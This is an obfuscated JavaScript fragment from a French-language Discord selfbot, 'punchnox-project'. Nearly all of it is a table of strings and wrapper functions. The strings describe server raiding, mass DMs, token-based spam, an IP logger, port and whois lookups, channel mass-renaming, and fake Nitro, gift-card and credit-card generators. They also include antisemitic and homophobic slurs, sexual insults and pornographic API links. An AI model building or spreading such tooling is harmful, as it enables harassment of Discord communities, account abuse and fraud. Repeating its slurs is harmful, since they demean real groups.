                          return gJ == gK;
                        }, ch.hKovU = 'SHkCl', ch.hrjwU = function (gJ, gK) {
                          return gJ !== gK;
                        }, ch.AojKa = function (gJ, gK) {
                          return gJ == gK;
                        }, ch.NDcCI = 'EyTNg', ch.OpGwl = function (gJ, gK) {
                          return gJ == gK;
                        }, ch.MVurI = function (gJ, gK) {
                          return gJ === gK;
                        }, ch.fTjdK = 'kUhvH', ch.VUQyg = 'pas de status custom trouvé', ch.WQMlN = function (gJ, gK) {
                          return gJ == gK;
                        }, ch.eRYmi = 'Token Info (settings)', ch.WpXsc = 'Ton ip est dans la console! 👍', ch.MMilA = 'les résultats de whois sonts sur ce lien : ', ch.MsvWI = '**:x: !Domaine/ip invalid :(**', ch.JhlBU = function (gJ, gK) {
                          return gJ === gK;
                        }, ch.lEVXQ = function (gJ, gK) {
                          return gJ + gK;
                        }, ch.jhAIS = '\n=========Whois analyse=========\n', ch.uXxKy = '\n==============================', ch.dNiDe = 'https://discordapp.com/api/oauth2/authorize?client_id=', ch.IQmCt = '&permissions=0&scope=bot', ch.RflSj = 'https://some-random-api.ml/img/koala', ch.sAVqJ = 'https://support.discordapp.com/hc/article_attachments/360013500032/nitro_gif.gif', ch.ewoCx = function (gJ, gK) {
                          return gJ + gK;
                        }, ch.hmOmQ = '/discord.gift/', ch.oOPlR = '0aA', ch.vjdqy = function (gJ, gK) {
                          return gJ == gK;
                        }, ch.RGOuy = function (gJ, gK) {
                          return gJ || gK;
                        }, ch.vAShr = function (gJ, gK) {
                          return gJ * gK;
                        }, ch.CrpdP = function (gJ, gK) {
                          return gJ - gK;
                        }, ch.bHKuj = function (gJ, gK) {
                          return gJ + gK;
                        }, ch.cQAJj = function (gJ, gK) {
                          return gJ - gK;
                        }, ch.hDILO = '**Picture Of Ass**', ch.fpxpr = '.jpg)', ch.GlwiM = 'http://media.obutts.ru/butts_preview/0', ch.XnNnE = '.jpg', ch.tbkyJ = 'brazzers', ch.clwtS = '***Tous les sms ont été mis dans ce lien hastebin :***\n', ch.Saolt = 'STREAMING', ch.ddVgp = '***multistream en cours***', ch.TLsQp = 'https://discord.gg/', ch.ywPOT = '**Invitation instantanée**', ch.jCblF = function (gJ, gK) {
                          return gJ + gK;
                        }, ch.PVLmP = '```', ch.RlxZL = '***Veuillez spécifié un text***.', ch.RYwye = '***Votre liste d\'amis est disponible sur ce lien :*** \n', ch.Ibcuu = '20%', ch.XHMRY = '40%', ch.XYfpB = '65%', ch.JpPNe = '80%', ch.rOJeA = 'calcul de relation plausible ❤', ch.jYeQd = 'relation estimée à ❤', ch.jaZwG = 'https://twitch.tv/punchnox', ch.XPBEA = 'PLAYING', ch.AHFPh = function (gJ, gK) {
                          return gJ === gK;
                        }, ch.CrBej = 'Vdllm', ch.oIItj = 'zXNVk', ch.vtnYK = 'Token info:\n le token n\'est pas valid', ch.qlJaR = 'glisse ton 🍑 en dm stp :)', ch.mQMJL = '713451199730548837', ch.TcPCP = 'sendnude', ch.sxCWC = 'https://cdn.discordapp.com/attachments/731197380732518460/744126950884507729/moteur-de-recherche.png', ch.rwixG = ':tada: :tada: **AYAYAYA MERCIII Papa Pablo#0666 un grand merci à toi pour cette api de folie (api skype,ipskype,phone...) moi je dit go rej **:tada: :tada:  \nhttps://discord.gg/escobar', ch.OAqde = 'je débite aussi vite que tu suces des bites', ch.qMmgD = 'https://risibank.fr/cache/stickers/d1430/143027-full.jpeg', ch.zVDMB = 'Impossible de trouver d\'images correspondant à votre recherche!', ch.knnMJ = 'dXWyB', ch.EUOoJ = function (gJ, gK) {
                          return gJ(gK);
                        }, ch.igRXA = 'pgif', ch.FjwCF = '4|2|0|5|1|6|3', ch.irCjr = 'searchmusic', ch.nqlmJ = function (gJ, gK) {
                          return gJ === gK;
                        }, ch.tLrgf = function (gJ, gK) {
                          return gJ + gK;
                        }, ch.jqpPo = 'https://api.alexflipnote.dev/drake?top=', ch.VNCGt = 'XGblo', ch.gjMvq = 'RoFux', ch.LXDzt = 'This Skype name is invalid!', ch.ZQanc = 'Wsymj', ch.TJbjR = 'https://cdn.discordapp.com/attachments/710119810360541284/737972425609969736/1200px-Skype_logo_2019present.svg.png', ch.sdulY = '** 「MENU FUN 2」 **', ch.hxfvg = '***Faire un Câlin***', ch.bNzKI = '```𝗦𝘂𝗶𝗰𝗶𝗱𝗲```', ch.pThOG = '***Kill Me***', ch.MqKyA = '```𝗿𝗶𝗽```', ch.MrbnZ = '***repose en paix***', ch.xBcmG = '```𝗯𝗼𝗼𝗺```', ch.rycsg = '***t\'explose fdp***', ch.LXsnt = '***veski***', ch.xPKPv = '```𝗝𝘂𝗶𝗳```', ch.bpjAz = '***juif detecté***', ch.nWdCr = '```𝘀𝘀𝗮𝘆𝗮𝗻```', ch.VLcav = '***super ssayan***', ch.gNsou = '```𝗼𝗺𝗴```', ch.DfwPo = '***omg regarde moi ça***', ch.vGJEk = '```𝗥𝗼𝘂𝘅```', ch.XknXg = '***mais tema la Geule du roux***', ch.wWZVA = '***calcule si tu es pd***', ch.eeDTq = '```𝗗𝗲́𝗯𝗶𝘁𝗮𝗴𝗲 ```', ch.WtUCR = '***je débite aussi vite que tu suces des bites***', ch.dpcZX = '***jvétniker fdp***', ch.tvdrv = '***génère un meme***', ch.TIYez = '```𝗯𝘁𝗰 ```', ch.JzEIs = '***Affiche la courbe du bitcoincoin***', ch.nnOSh = '***Affiche la courbe Ethereum***', ch.bEFoP = '```𝗟𝘁𝗰 ```', ch.Uqllm = '***Affiche la courbe LTC***', ch.sXGWb = '```𝘁𝗼𝗱𝗮𝘆 ```', ch.YDGuu = '***Check si on est mardi***', ch.sJxfC = '```𝗡𝗲𝗼𝗻𝗲𝗳𝗳𝗲𝗰𝘁 + {msg}```', ch.bbApH = '```𝗡𝗼𝗲𝗹 + {msg}```', ch.UdPFt = '```𝗕𝗹𝗼𝗼𝗱 + {msg}```', ch.dyoHC = '```𝗟𝗶𝗴𝗵𝘁 + {msg}```', ch.VdtJK = '7|2|3|6|1|5|4|8|0', ch.PfrgZ = 'MM/DD/YYYY 𝙖 HH: ss', ch.qaNfx = 'USER blacklisted', ch.SMofn = 'Activé', ch.dRlPw = 'FjLxQ', ch.zFtLd = function (gJ, gK) {
                          return gJ === gK;
                        }, ch.GUHuZ = 'https://cdn.discordapp.com/attachments/603949531700396032/603951212567724042/3169546865_1_3_8YcAOoIs.gif', ch.ykxKJ = 'PVIEj', ch.SGhld = 'No open ports', ch.HMRNv = 'Twitter', ch.EaNbx = '698916141896171630', ch.qjeTN = 'twitter', ch.RlWoH = 'QEBTK', ch.CHrVR = 'LXhFA', ch.QSMrS = 'résultat: \n', ch.yvujm = 'https://neko-love.xyz/api/v1/nekolewd', ch.zGrpX = 'Invalid IP Address', ch.EimXP = function (gJ, gK) {
                          return gJ === gK;
                        }, ch.mVvDN = 'WxNCv', ch.CkDOs = 'fAHgs', ch.EHXvw = ':x: **Ce serveur est dans la blacklist donc vous ne pouvez pas le raid.**', ch.hECfM = 'DNS couldn\'t be resolved', ch.lvfkk = function (gJ, gK) {
                          return gJ !== gK;
                        }, ch.EInZL = 'JTbhe', ch.JozZk = 'QagbR', ch.eJdPh = 'vShKW', ch.YmEsf = '```𝗨𝘀𝗲𝗿𝗜𝗻𝗳𝗼```', ch.FvvIn = '```𝗨𝘀𝗲𝗿𝗣𝘃𝗜𝗻𝗳𝗼```', ch.IufbC = '***Affiche l\'avatar de la personne mentionner***', ch.cLPYH = '***montre ton token les logs (la console)***', ch.kXTqD = '```𝗹𝗰𝗹𝗲𝗮𝗿```', ch.KWCnq = '***Affiche les infos d\'un role***', ch.WqvpM = 'https://cdn.discordapp.com/attachments/681115950912897084/683624550721912836/IMG_20200301_113909.png', ch.bTUqc = 'https://cdn.discordapp.com/attachments/681115950912897084/683624550990217223/IMG_20200301_113811.png', ch.zwkIq = function (gJ, gK) {
                          return gJ === gK;
                        }, ch.IOTcU = 'LVWCV', ch.DQEaH = function (gJ, gK) {
                          return gJ * gK;
                        }, ch.DYgeM = '𝙛𝙪𝙢𝙚 𝙪𝙣 𝙜𝙧𝙤𝙨 𝙨𝙩𝙞𝙘𝙠𝙤𝙨', ch.medSa = function (gJ, gK) {
                          return gJ === gK;
                        }, ch.obwIH = function (gJ, gK) {
                          return gJ !== gK;
                        }, ch.oOkrI = 'uDvRs', ch.TTpvp = 'Youtube mp3', ch.REzCs = 'Tor verif', ch.dzfYy = 'Le lien est bien valid', ch.HoKNp = 'Le lien n\'est pas valide', ch.DdHrg = 'hEIMU', ch.DWtbh = '- [', ch.iUgNR = '] Le token n\'a pas été trouvé. Vérifi si tu as bien rentré le token dans le config.js', ch.NeCmD = 'host checker', ch.ZDRhg = function (gJ, gK) {
                          return gJ !== gK;
                        }, ch.whqeg = 'fDCYJ', ch.PwQCY = function (gJ, gK) {
                          return gJ + gK;
                        }, ch.MRshH = function (gJ, gK) {
                          return gJ + gK;
                        }, ch.QwGnO = '```html\n', ch.rrwuP = '***RANDOM CARTE***', ch.qapwC = function (gJ, gK) {
                          return gJ + gK;
                        }, ch.VgnxY = function (gJ, gK) {
                          return gJ === gK;
                        }, ch.XWBda = 'Créer une invitation instantanée', ch.EbSsL = 'Ban des mmembres', ch.mnjsA = 'Modifier des salons', ch.tjzJM = 'Modifier le serveur', ch.aPvqh = 'Acces aux logs ', ch.orCsQ = 'Voix prioritaire', ch.ucUys = 'Faire un partage de jeux', ch.rRbKT = 'Lire les messages', ch.OHHLx = 'Supprimer des messages', ch.sMEDt = 'Faire des embeds', ch.bVEIY = 'Attacher un fichier', ch.TvyWN = 'Voir les anciens messages', ch.SgqEJ = 'Mentionner tous le monde', ch.CAOXN = 'Utiliser des emojis externes', ch.BZBvn = 'Mettre en sourdine des membres', ch.VGwvD = 'Move des membres', ch.JqHaP = 'Changer de pseudo', ch.UhiJA = 'Modifier les pseudos', ch.PmhMn = 'Modifier les rôles', ch.DQrTm = 'Modifier les webhooks', ch.eZbrU = 'Modifier les emojis', ch.kBTPm = 'https://some-random-api.ml/img/red_panda', ch.wvmkP = '**Address Random**', ch.NhVhp = function (gJ, gK, gL) {
                          return gJ(gK, gL);
                        }, ch.mdqnq = function (gJ, gK, gL) {
                          return gJ(gK, gL);
                        }, ch.yhCvG = function (gJ, gK) {
                          return gJ * gK;
                        }, ch.SPTrW = '**Tu n\'as pas la permission \'MANAGE_GUILD\' ! :x:**', ch.FlIbp = '***il manque un argument!***', ch.kmUwT = function (gJ, gK) {
                          return gJ + gK;
                        }, ch.hzdhA = function (gJ, gK) {
                          return gJ + gK;
                        }, ch.GLsXu = '```Je rename les ', ch.xExiv = function (gJ, gK) {
                          return gJ < gK;
                        }, ch.doxQf = '```tous les channels on été rename ✅```', ch.icznw = ' ```𝗡𝗶𝘁𝗿𝗼``` ', ch.gIFuS = '***gen un nitro random***', ch.vcGbG = ' ```𝗠𝗲𝘁𝗮𝗹``` ', ch.EXEiB = ' ```𝗣𝘀𝗻``` ', ch.AFOgC = '***gen un code psn random***', ch.FXDmP = ' ```𝗫𝗯𝗼𝘅``` ', ch.cfPmS = '***gen un code xbox random***', ch.VzFMm = ' ```𝗡𝗼𝗿𝗱𝘃𝗽𝗻``` ', ch.bbPCQ = ' ```𝗚𝘁𝗼𝗸𝗲𝗻``` ', ch.xCZhv = ' ```𝗗𝗼𝗳𝘂𝘀``` ', ch.XSqmY = ' ```𝗮𝗰𝗰𝘁𝗽𝘀𝗻``` ', ch.PPqzR = ' ```𝗥𝗮𝗻𝗱𝗼𝗺𝗰𝗼𝗹𝗼𝗿``` ', ch.cwXZE = '***gen une adresse gmail random***', ch.BHlwG = ' ```𝗖𝗖``` ', ch.mgAUn = '***𝐁𝐢𝐞𝐧𝐯𝐞𝐧𝐮𝐞 𝐬𝐮𝐫 𝐥𝐞 𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩 𝐒𝐞𝐥𝐟𝐛𝐨𝐭 ! ***', ch.iuBlc = 'https://cdn.discordapp.com/attachments/708383271284768838/710942768406593596/20200515_215214.png', ch.EwFDh = '#ff1010', ch.OcPYQ = 'une erreur est survenue que je ne peux régler', ch.Ksukf = '/Data/codes.json', ch.cRLTk = function (gJ, gK) {
                          return gJ + gK;
                        }, ch.xhuKP = '/Data/backups.json', ch.nrVYh = function (gJ, gK) {
                          return gJ !== gK;
                        }, ch.UyzyJ = 'azsXE', ch.wAfaQ = function (gJ, gK) {
                          return gJ + gK;
                        }, ch.VhsQC = '***Mpall en cours avec le message :*** ', ch.QosIZ = '6|5|3|1|0|4|2', ch.MKPNN = '**liste guilds**', ch.qtrBq = '```lien hastebins```', ch.DcXqs = 'For Loading A Backup', ch.sarPq = function (gJ, gK) {
                          return gJ + gK;
                        }, ch.iltQw = function (gJ, gK) {
                          return gJ <= gK;
                        }, ch.GhjPk = function (gJ, gK) {
                          return gJ + gK;
                        }, ch.ojyDl = '```[', ch.GxYEH = ']  -  ', ch.ZAraG = 'loading..```', ch.LWwMR = '`Succesfull load.`', ch.IEWkR = 'Commande load effectué', ch.FuliE = ']```', ch.GqxwK = 'css', ch.JntCp = '__**Spam stopped successfully**__ :white_check_mark:', ch.NvdEK = function (gJ, gK) {
                          return gJ * gK;
                        }, ch.RRSvN = '12|4|0|8|13|10|1|14|2|5|9|3|6|11|7', ch.FMuQx = '>>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓░░░░░░░░░░░░░░░░░░░░ 20%', ch.eOSfT = '>>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░ 80%', ch.uqEQU = '>>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░░ 28%', ch.WETQq = function (gJ, gK) {
                          return gJ * gK;
                        }, ch.WjnVL = '>>> Restock  en cours \n **Chargement.** \n ▓░░░░░░░░���░░░░░░░░░░░░░░░ 4%', ch.fMryD = '>>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░░░░ 32%', ch.iZZRK = '>>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░ 64%', ch.rKrqz = '(Commande : {/pornhub} Effectuer) \n ================', ch.VwmlH = '6|9|4|3|8|1|0|2|5|7', ch.voXuz = '>>> Restock  en cours \n **Chargement...** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░░░░░░ 79%', ch.tSexI = '>>> Restock  en cours \n **Chargement.** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓100% ', ch.BslyZ = '>>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓░░░░░░░░░░░░░░ 44%', ch.cljSU = function (gJ, gK) {
                          return gJ * gK;
                        }, ch.XijTJ = '>>> Restock  en cours \n **Chargement.** \n ▓░░░░░░░░░░░░░░░░░░░░░░░░ 4%', ch.USyRE = function (gJ, gK) {
                          return gJ + gK;
                        }, ch.IemPC = '>>> ***Voila ton token pour spam :*** ', ch.nXJHU = 'https://regmedia.co.uk/2016/09/22/wifi_icon_shutterstock.jpg?x=1200&y=794', ch.XSydx = 'Membres', ch.xMvPJ = 'Salons', ch.usmtI = function (gJ, gK) {
                          return gJ + gK;
                        }, ch.SmaRt = '**:x: il manque un argument**', ch.KEenu = 'OzYYQ', ch.lLpGm = 'zStYG', ch.bUpnC = function (gJ) {
                          return gJ();
                        }, ch.NVCQy = '***Votre Riche Presence custom a chargé avec succès***', ch.nIxbX = 'H4x0r detecté', ch.HHCRw = 'name', ch.FOhXq = 'feelsbadman', ch.lGAMq = 'epicUserHandle', ch.nbMpc = 'value', ch.CoXma = 'https://fortnitetracker.com/profile/pc/', ch.sLMkF = function (gJ, gK) {
                          return gJ + gK;
                        }, ch.HKGyf = '\nwins: ', ch.JKkIv = function (gJ, gK) {
                          return gJ + gK;
                        }, ch.DloRt = '\nwinrate: ', ch.jmisC = function (gJ, gK) {
                          return gJ + gK;
                        }, ch.FANbW = '\nkd: ', ch.MEaJy = 'https://cdn2.unrealengine.com/Fortnite%2Fhome%2Ffn_battle_logo-1159x974-8edd8b02d505b78febe3baacec47a83c2d5215ce.png', ch.gpAQq = 'brPhD', ch.otpSI = 'vSqjE', ch.OUmsM = 'data', ch.wfYBM = 'end', ch.hAbxW = function (gJ, gK) {
                          return gJ !== gK;
                        }, ch.CdLdY = 'MUlVC', ch.wGesT = 'https://nekos.life/api/v2/img/slap', ch.IwCcy = function (gJ, gK, gL) {
                          return gJ(gK, gL);
                        }, ch.MJiLJ = 'pyMql', ch.GEflq = function (gJ, gK) {
                          return gJ + gK;
                        }, ch.ZiqiH = '   2', ch.NObUh = function (gJ, gK) {
                          return gJ === gK;
                        }, ch.iImuM = function (gJ, gK, gL) {
                          return gJ(gK, gL);
                        }, ch.vLOCQ = function (gJ, gK) {
                          return gJ(gK);
                        }, ch.cICxm = function (gJ, gK) {
                          return gJ + gK;
                        }, ch.toiTU = function (gJ, gK) {
                          return gJ === gK;
                        }, ch.RThPL = 'https://api.alexflipnote.dev/scroll?text=', ch.NPWEE = 'tobecontinued.gif', ch.zzEqO = 'Ip logger', ch.JhFzs = '𝙨𝙩𝙖𝙩𝙪𝙨 𝙉𝙚𝙠𝙤', ch.TgZXL = '4|5|3|2|1|0', ch.xNmRD = function (gJ, gK, gL) {
                          return gJ(gK, gL);
                        }, ch.cwmXA = '***farm xp en cours..***', ch.iirLw = 'GREYSCALE', ch.gVPIT = 'https://some-random-api.ml/canvas/greyscale?avatar=', ch.rQkBU = '?size=2048', ch.WEIgm = '** 「MENU UTILS (tools 4)」 **', ch.yKBed = '```𝗴𝘂𝗶𝗹𝗱 𝗰𝗿𝗲𝗮𝘁𝗲```', ch.FOOFH = '```𝗳𝗮𝗿𝗺𝗲𝘅𝗽```', ch.jMgNs = '```𝘀𝘁𝗼𝗽𝗳𝗮𝗿𝗺𝗲𝘅𝗽```', ch.ylDUi = '```𝘁𝗿𝗮𝗱 + {langue} + {msg}```', ch.BLfWz = '```𝗶𝗻𝗳𝗼𝘆𝘁𝗯 + {id vidéo}```', ch.qQqON = '```𝗖𝘂𝗿𝗿𝗲𝗻𝗰𝘆```', ch.belmd = '***Affiche combien 1 usd vaut en euro***', ch.SsWWT = '```𝗔𝗹𝗹𝘂𝘀𝗱```', ch.JQFor = '***Affiche combien 1 usd vaut dans le monde (toutes les monnaies)***', ch.DUFIF = '***Quitte le serveur actuel***', ch.pEGyj = '```𝗰𝗵𝗮𝗻𝗻𝗲𝗹𝘃𝗶𝗲𝘄```', ch.oJTPT = '***Affiche tous les channels du serveurs même ceux que tu ne vois pas***', ch.LfYEt = '𝙨𝙩𝙖𝙩𝙪𝙨 𝙧𝙚𝙩𝙧𝙤', ch.LZSxA = function (gJ, gK) {
                          return gJ === gK;
                        }, ch.pGQvC = function (gJ, gK) {
                          return gJ === gK;
                        }, ch.SkerP = function (gJ, gK) {
                          return gJ === gK;
                        }, ch.BGDrV = function (gJ, gK) {
                          return gJ == gK;
                        }, ch.BFIYh = 'Aucune Restriction', ch.poiTm = function (gJ, gK) {
                          return gJ + gK;
                        }, ch.VuzHr = function (gJ) {
                          return gJ();
                        }, ch.wCEzX = function (gJ, gK) {
                          return gJ !== gK;
                        }, ch.CSTXc = 'hNVcU', ch.NNZqb = function (gJ, gK) {
                          return gJ + gK;
                        }, ch.WzlSp = '** est AFK**: `Sans Raison précises`', ch.MlmJj = function (gJ, gK) {
                          return gJ + gK;
                        }, ch.CTwlb = function (gJ, gK) {
                          return gJ + gK;
                        }, ch.PMMRS = function (gJ, gK) {
                          return gJ + gK;
                        }, ch.aUCLG = '** est AFK pour ** :', ch.xVtxE = 'light', ch.ebUTU = 'invisible', ch.pLARK = 'offline', ch.reEvn = 'idle', ch.ctHyo = function (gJ, gK) {
                          return gJ * gK;
                        }, ch.tsUNV = 'https://discordapp.com/api/v6/users/@me/settings', ch.IoArb = function (gJ, gK) {
                          return gJ === gK;
                        }, ch.iEOBF = 'VYQiw', ch.hzmEq = 'fDnuH', ch.EmOAv = 'https://nekobot.xyz/api/imagegen?type=iphonex&url=', ch.hJeZH = '***Tu n\'as pas la permission de bannir un membre ! :x:***', ch.WBysm = '\nSelfbot développé par punchnox', ch.PvOUZ = '/commandes/', ch.RadFU = '[32mLe dossier commandes à créé avec succes, vous pouvez relancer le selfbot.[0m', ch.LYUAq = '[31mIl manque le dossier commandes[0m', ch.bjiBb = '[33mCréation du dossier manquant en cours...[0m', ch.dJkDF = '20|11|17|2|9|14|23|12|13|6|0|21|1|22|24|15|19|10|5|18|3|25|16|8|7|4', ch.sSTOE = 'https://cdn.discordapp.com/attachments/714904917705228299/717085400472223794/allez_marcel.mp4', ch.BWaOK = 'IvYmA', ch.YtTkw = 'bypass Linkvertise', ch.BdXXk = 'https://cdn.discordapp.com/attachments/731197380732518460/741581583869411328/xQLyjj4x_400x400.jpg', ch.jkrdY = '`^ (°□°）^`', ch.njyeP = 'https://discordapp.com/api/v6/guilds', ch.IZWtt = 'europe', ch.aqFHb = 'punchnox-project selfbot', ch.GMvxk = function (gJ, gK, gL, gM) {
                          return gJ(gK, gL, gM);
                        }, ch.QOQVv = '**Serveur create**', ch.DvykD = '***le serveur a bien été créé***', ch.kGAYv = 'yGXkR', ch.XnVYg = 'farm xp punchnox-project', ch.pjNbi = 'fpMJt', ch.aUibO = function (gJ, gK) {
                          return gJ !== gK;
                        }, ch.RwYvr = 'nCXkV', ch.SegNI = 'NnXlK', ch.GvmlC = '1|9|3|7|10|2|6|4|0|5|8', ch.saXFs = '>>> Restock  en cours \n **Chargement..** \n ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓░░ 92%', ch.EttXK = '>>> ***Voila ton compte netflix :***', ch.XpNuH = function (gJ, gK, gL) {
                          return gJ(gK, gL);
                        }, ch.mVJVq = function (gJ, gK) {
                          return gJ === gK;
                        }, ch.OhJDK = 'fix', ch.EEscL = 'EUR: ', ch.QMSSs = 'USD: ', ch.kjdLr = 'https://cdn.discordapp.com/attachments/732513063231684640/732513084668772383/A-propos-de-cette-Orange-B-...-Lhistoire-des-logos.jpg', ch.WirkN = 'USD all', ch.UrFli = 'https://cdn.pixabay.com/photo/2017/10/21/08/11/usd-2874026_960_720.jpg', ch.pOmvY = 'uNFoB', ch.IflWs = 'ETH Stats', ch.UcwTG = function (gJ, gK) {
                          return gJ + gK;
                        }, ch.WpFlV = function (gJ, gK) {
                          return gJ + gK;
                        }, ch.putOk = 'https://cdn.discordapp.com/attachments/732513063231684640/732513084933144666/pp840x830-pad1000x1000f8f8f8.u3.jpg', ch.rbkzi = 'https://discordapp.com/api/v6/users/@me', ch.avBAy = function (gJ, gK, gL, gM) {
                          return gJ(gK, gL, gM);
                        }, ch.ypLBr = 'QhHyA', ch.BNSkR = 'QRKaL', ch.xVbjK = '▓▓░░░░░░░░ 20%', ch.QKCcO = 'SPZUq', ch.wzBjw = 'XPBcg', ch.kvYKT = 'HBkyN', ch.YhMus = 'beautiful.gif', ch.Ghnom = 'fire.gif', ch.JvaAn = 'emboss.gif', ch.UDVCB = 'posterize.gif', ch.uRVaJ = 'crush.gif', ch.BcXwV = function (gJ) {
                          return gJ();
                        }, ch.eFovt = '𝙨𝙩𝙖𝙩𝙪𝙨 𝙗𝙡𝙖𝙘𝙠-𝙘𝙡𝙤𝙫𝙚𝙧', ch.jhTvL = '***:x: Manque de permission pour certains membres. ! ***', ch.rbwPE = function (gJ, gK) {
                          return gJ === gK;
                        }, ch.OtPxF = function (gJ, gK) {
                          return gJ % gK;
                        }, ch.GnUXp = function (gJ, gK) {
                          return gJ + gK;
                        }, ch.FzbOy = function (gJ, gK) {
                          return gJ + gK;
                        }, ch.cwUxm = 'Lancement du punchnox-project', ch.qefNj = ':warning: ||', ch.UXvfz = '|| :warning:', ch.abrFa = '```Name:```', ch.YyAiI = '```ID:```', ch.aPxwK = '```Type:```', ch.RiUlA = '```Spécificités:```', ch.iEQTj = '```Abilities:```', ch.okKij = '```Groupe:```', ch.fvjSK = '```Experience:```', ch.hYwQB = '```Hp:```', ch.JefiV = '```Attack:```', ch.tMAru = '```Vitesse d\'attaque:```', ch.sjBoM = '```Vitesse de defense:```', ch.GUlVn = '```Vitesse:```', ch.bNsPD = '```Hauteur:```', ch.MNNEX = '```Speed:```', ch.ztTWv = '4|1|0|2|3', ch.dUzvx = 'Paroles: ', ch.wyVCR = 'dist-tags', ch.KaPXV = 'https://i.imgur.com/ErKf5Y0.png', ch.qpWyd = 'https://www.npmjs.com/', ch.DAfEi = '❯ Version', ch.fdqTM = '❯ License', ch.lLvWd = 'None', ch.zWqXR = '???', ch.gLNiQ = 'MM/DD/YYYY h:mm A', ch.LFpTl = '❯ Modification Date', ch.EsTXk = 'index.js', ch.WtoiY = 'rip.gif', ch.HXLov = 'Github', ch.LwTce = '719905369723502602', ch.FQabQ = 'https://nekobot.xyz/api/imagegen?type=changemymind&text=', ch.npeJn = 'https://gyazo.com/cd41d3f3c5bf09ac6a5b243b0a95b30d', ch.mctnn = function (gJ, gK) {
                          return gJ + gK;
                        }, ch.LEkAV = function (gJ, gK, gL, gM) {
                          return gJ(gK, gL, gM);
                        }, ch.NdGvT = 'txjCd', ch.vZVSU = 'ePuuy', ch.znyVR = 'punchnox project', ch.NhEfI = '𝙨𝙩𝙖𝙩𝙪𝙨 𝙝𝙪𝙣𝙩𝙚𝙧', ch.WugCP = function (gJ, gK) {
                          return gJ === gK;
                        }, ch.CHbMI = '** 「INFO」 **', ch.XnpRT = ' ``` 📣 𝗩𝗲𝗿𝘀𝗶𝗼𝗻``` ', ch.PlVRr = ' ``` 🔐 𝗔𝟮𝗳```', ch.ocIhm = ' ``` 📜 𝗖𝗵𝗮𝗻𝗻𝗲𝗹𝘀```', ch.oxhxb = ' ``` 👥 𝗔𝗺𝗶𝘀```', ch.mfwbY = ' ``` 🗄️ 𝗦𝗲𝗿𝘃𝗲𝘂𝗿```', ch.iURfh = ' ``` ✉️ 𝗲𝗺𝗮𝗶𝗹 𝘃𝗲𝗿𝗶𝗳```', ch.zUZGr = ' ``` 💻 𝗨𝘀𝗲𝗿𝘀```', ch.ytkhk = ' ``` 📊 𝗠𝗲𝗺𝗼𝗶𝗿𝗲 𝗨𝘀𝗮𝗴𝗲(Ram) ``` ', ch.ETKNH = function (gJ, gK) {
                          return gJ / gK;
                        }, ch.lXKEH = '``` 🔒 Version Node```', ch.fOWgA = ' ``` ⌚ 𝗨𝗽𝘁𝗶𝗺𝗲```', ch.cXrIj = 'chrome', ch.EdjLA = 'retro.png', ch.FIzXp = function (gJ) {
                          return gJ();
                        }, ch.gTHbU = 'https://cdn.discordapp.com/attachments/681115950912897084/683626151260061744/2413-full.gif', ch.jhPXq = 'https://cdn.discordapp.com/attachments/681115950912897084/683626152191066140/10135-full.gif', ch.QiGnZ = 'https://cdn.discordapp.com/attachments/681115950912897084/683626152446656572/telechargement.jpeg', ch.sHLeD = function (gJ, gK) {
                          return gJ * gK;
                        }, ch.cNhKA = 'g pas lu :)', ch.LRczp = function (gJ, gK) {
                          return gJ * gK;
                        }, ch.IMWeg = ' ``` 👱‍♂️ 𝗨𝘀𝗲𝗿𝗻𝗮𝗺𝗲```', ch.MrQfF = ' ``` 🎆 𝗣𝗿𝗲𝗳𝗶𝘅``` ', ch.lVLko = ' ``` 📱 𝗽𝗼𝗿𝘁𝗮𝗯𝗹𝗲 𝘀𝘂𝗿 𝗹𝗲 𝗰𝗼𝗺𝗽𝘁𝗲```', ch.VzXxS = '``` ⚙️ Arch```', ch.NSoFA = '``` 🔒 Discord.js```', ch.ykqbp = '``` 📈 CPU usage```', ch.hvfrS = function (gJ, gK) {
                          return gJ == gK;
                        }, ch.XtOog = 'jreWX', ch.gefuY = '𝙋𝙪𝙣𝙘𝙝𝙣𝙤𝙭-𝙋𝙧𝙤𝙟𝙚𝙘𝙩 (rpc free)', ch.ZZzOZ = function (gJ, gK) {
                          return gJ !== gK;
                        }, ch.Oqdww = 'Ton hostname est dans la console! 👍', ch.uTPUZ = 'nitro classic', ch.gtVTa = 'HgBCW', ch.oLBXu = 'YmAob', ch.atgta = function (gJ) {
                          return gJ();
                        }, ch.ePNWQ = 'id du role:', ch.IzsCM = 'nombre de membres ayant ce role:', ch.ARnCr = 'position:', ch.rMOKr = 'mentionnable:', ch.ANelj = 'EMBED_LINKS', ch.VrTSE = function (gJ, gK) {
                          return gJ !== gK;
                        }, ch.KMWOB = 'https://nekos.life/api/v2/img/les', ch.niMzH = function (gJ, gK) {
                          return gJ(gK);
                        }, ch.WlSto = function (gJ, gK) {
                          return gJ <= gK;
                        }, ch.pUcZA = function (gJ, gK) {
                          return gJ(gK);
                        }, ch.otRvo = function (gJ, gK) {
                          return gJ <= gK;
                        }, ch.qeMAx = function (gJ, gK) {
                          return gJ / gK;
                        }, ch.nyseT = function (gJ, gK) {
                          return gJ * gK;
                        }, ch.yPrBO = function (gJ, gK) {
                          return gJ / gK;
                        }, ch.xYNxb = function (gJ, gK) {
                          return gJ * gK;
                        }, ch.JbYEt = function (gJ, gK) {
                          return gJ(gK);
                        }, ch.wqPoX = 'ORiVj', ch.qGsav = function (gJ, gK) {
                          return gJ === gK;
